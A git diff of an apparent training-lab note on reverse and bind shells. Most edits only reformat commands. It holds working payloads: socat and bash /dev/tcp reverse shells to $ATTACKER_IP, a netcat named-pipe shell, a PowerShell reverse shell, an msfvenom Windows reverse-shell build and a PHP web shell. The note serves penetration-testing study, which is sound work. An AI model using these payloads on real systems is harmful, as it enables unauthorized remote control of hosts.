@@ -9,7 +9,12 @@ Socat can also make encrypted connections, which foil after-the-fact network ana
 ```bash
 # Generate a self-signed certificate.
 #
-openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
+openssl req -newkey rsa:2048 \
+            -nodes \
+            -keyout shell.key \
+            -x509 \
+            -days 362 \
+            -out shell.crt
 
 # Create a PEM file combining the certificate and key.
 #
@@ -17,11 +22,14 @@ cat shell.key shell.crt > shell.pem
 
 # Start a listener.
 #
-socat OPENSSL-LISTEN:$LISTENER_PORT,cert=shell.pem,verify=0 -
+socat \
+OPENSSL-LISTEN:$LISTENER_PORT,cert=shell.pem,verify=0 -
 
 # Start the reverse shell on the target.
 #
-socat OPENSSL:$ATTACKER_IP:$LISTENER_PORT,verify=0 EXEC:"/bin/bash -li"
+socat \
+OPENSSL:$ATTACKER_IP:$LISTENER_PORT,verify=0 \
+EXEC:"/bin/bash -li"
 ```
 
 The PEM file needs to be generated on whichever system is listening, so for a bind shell the first two steps will need to be done on the target instead of the attacker. The `verify=0` directive turns off certificate validation, so this isn’t a “secure” connection in the sense that it’s been *authenticated*, but it is secure in the sense that it’s *encrypted*.
@@ -32,10 +40,12 @@ Auto-stabilized shell using encryption (UNIX-like targets only):
 
 ```bash
 # Attacker: Connect $LISTENER_PORT to the current TTY,
-# send raw keycodes, and turn off terminal echo. Basically
-# the `stty raw -echo`.
+# send raw keycodes, and turn off terminal echo.
+# Basically the `stty raw -echo`.
 #
-socat OPENSSL-LISTEN:$LISTENER_PORT,cert=shell.pem,verify=0 FILE:`tty`,raw,echo=0
+socat \
+OPENSSL-LISTEN:$LISTENER_PORT,cert=shell.pem,verify=0 \
+FILE:`tty`,raw,echo=0
 
 # Target: Connect the listener on the attacker to an
 # interactive login bash shell.
@@ -47,7 +57,9 @@ socat OPENSSL-LISTEN:$LISTENER_PORT,cert=shell.pem,verify=0 FILE:`tty`,raw,echo=
 #     sane   - use a variety of tweaks to “normalize” the
 #              terminal’s environment
 #
-socat OPENSSL:$ATTACKER_IP:$LISTENER_PORT,verify=0 EXEC:"/bin/bash -li",pty,stderr,sigint,setsid,sane
+socat \
+OPENSSL:$ATTACKER_IP:$LISTENER_PORT,verify=0 \
+EXEC:"/bin/bash -li",pty,stderr,sigint,setsid,sane
 ```
 
 ### Common Shell Payloads
@@ -57,10 +69,12 @@ Pre-compiled, statically-linked Windows binaries for red teaming can be found in
 Because the `-e` switch is considered insecure (for the very reasons we’re fond of it), many UNIX-like operating systems ship a version of netcat without it. Working around this leads to the common named pipe pattern:
 
 ```bash
-mkfifo /tmp/p; nc -lvnp $LISTENER_PORT < /tmp/p | /bin/sh >/tmp/p 2>&1; rm /tmp/p
+mkfifo /tmp/p
+nc -lvnp $LISTENER_PORT < /tmp/p | /bin/sh >/tmp/p 2>&1
+rm /tmp/p
 ```
 
-(This example creates a bind shell, but we’ve also seen [examples that create reverse shells](2021-10-02-tryhackme-complete-beginner.md). Note that it’s also possible to reverse the /bin/sh and nc portions of things; what important is that the named pipe lets us loop I/O between the two applications.)
+(This example creates a bind shell, but we’ve also seen examples that create reverse shells. Note that it’s also possible to reverse the /bin/sh and nc portions of things; what important is that the named pipe lets us loop I/O between the two applications.)
 
 You can do the same thing with PowerShell to create a reverse shell, albeit with a much more cryptic command.
 
@@ -70,7 +84,8 @@ powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<IP>',<PORT>);
 
 Note that `<IP>` and `<PORT>` need to be appropriately replaced in the above code.
 
-See also: [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md).
+* [2021-10-02 TryHackMe: Complete Beginner](2021-10-02-tryhackme-complete-beginner.md)
+* [PayloadsAllTheThings Reverse Shell Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
 
 ### msfvenom
 
@@ -84,7 +99,9 @@ As memory scanning has become more common, staged payloads have lost some of the
 Fortunately (unfortunately?) msfvenom will automate our reverse shell needs. It can, among other things, generate Windows executables that will set up a reverse shell for you.
 
 ```bash
-msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=$ATTACKER_IP LPORT=$LISTENER_PORT
+msfvenom -p windows/x64/shell/reverse_tcp \
+         -f exe -o shell.exe \
+         LHOST=$ATTACKER_IP LPORT=$LISTENER_PORT
 ```
 
 The payload (`-p`) switch takes a Metasploit payload name. Payloads follow the OS/ARCHITECTURE/PAYLOAD (though ARCHITECTURE is not included for 32-bit Windows payloads). Staged payloads replace the first `_` with a `/`, so windows/x64/shell/reverse_tcp is a staged while windows/x64/shell_revers_tcp is stageless.
@@ -102,7 +119,9 @@ Be sure to set the right PAYLOAD when using multi/handler!
 Webshells are shells that run within a webserver, typically receiving input via GET variables or a form, and outputting to the page HTML. So, the simplest (PHP) web shell might be:
 
 ```php
-<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
+<?php
+	echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>";
+?>
 ```
 
 Web shells are, by their nature, non-interactive.
@@ -142,7 +161,7 @@ Okay, the auto-stabilized socat shells are pretty freakin’ cool.
 
 …Also, I’m really not sure why socat’s syntax is considered that much harder. It’s pretty readable.
 
-> Look through [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) and try some of the other reverse shell techniques. Try to analyze them and see *why* they work.
+> Look through PayloadsAllTheThings and try some of the other reverse shell techniques. Try to analyze them and see *why* they work.
 
 If you have access to bash with the virtual /dev/tcp device (this actually live in bash, not in /dev) then this is a pretty handy reverse shell:
 
@@ -150,9 +169,13 @@ If you have access to bash with the virtual /dev/tcp device (this actually live 
 bash -li &> /dev/tcp/$ATTACKER_IP/$LISTENER_PORT 0>&1
 ```
 
-Catch it with [netcat](../notes/netcat.md) or [socat](../notes/socat.md).
+Catch it with netcat or socat.
 
 (That said, the fact that all of my file descriptors wind up pointing at /dev/tcp is a little mysterious to me. I *think* what’s happening here is that /dev/tcp is bidirectional “out of the box” — incoming data comes out, just as outgoing data goes in — so binding all three “core” file descriptors to it does the right thing. That, and realize that the `X>&Y` construct means “bind file descriptor X to file descriptor Y”, and `&>` is just short for `2>&1 >`, and `>` is just short for `1 >`. So really what’s happening here is that we bind STDERR to STDOUT with and implicit `2>&1`, then bind STDOUT to /dev/tcp with an implicit `1 >`, then bind STDIN to /dev/tcp as well with `0>&1`.)
+
+* [PayloadsAllTheThings Reverse Shell Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
+* [Using “netcat”](../notes/netcat.md)
+* [Using “socat”](../notes/socat.md)
 
 ### Windows Practice Box
 
@@ -186,7 +209,12 @@ It’s worth noting that users added via `net user` seem to bypass Windows’ pa
 It seems that xfreerdp is installed on Kali Linux, so we can connect from there.
 
 ```bash
-xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:$TARGET_IP /u:$USER /p:$PASSWORD
+xfreerdp /dynamic-resolution \
+         +clipboard \
+         /cert:ignore \
+         /v:$TARGET_IP \
+         /u:$USER \
+         /p:$PASSWORD
 ```
 
 > Experiment using socat and netcat to obtain reverse and bind shells on the Windows Target.
